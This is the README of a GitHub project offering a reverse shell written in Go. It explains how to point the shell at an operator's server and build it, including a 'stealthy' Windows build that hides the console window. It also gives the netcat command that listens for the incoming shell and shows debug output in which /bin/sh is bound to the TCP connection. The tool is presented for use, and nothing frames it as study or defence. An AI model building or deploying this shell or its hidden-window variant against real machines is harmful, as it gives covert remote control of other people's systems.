# reverse-shell-go

### Simple reverse shell written in go

To use: 
- Set the host address near the top to your server. `const host = "127.0.0.1:1234`
- Build using `go build main.go`
- Stealthy version `GOOS=windows go build -ldflags="-s -w -H=windowsgui" main.go` (Windows target, build from macos)
- Start listening on the server using `netcat -l -p 8080`

Example debug output
```
github.com/orf1/reverse-shell-go
attempting to establish tcp connection with server
dial tcp 127.0.0.1:8080: connect: connection refused
attempting to establish tcp connection with server
connection established
detecting operating system
detected mac or linux, using /bin/sh
binding standard interfaces to connection
shell opened
```
<img width="572" alt="Screen Shot 2022-08-08 at 2 47 48 PM" src="https://user-images.githubusercontent.com/39539212/183520624-33592bda-2509-435b-8eb3-a5b04f590eb7.png">
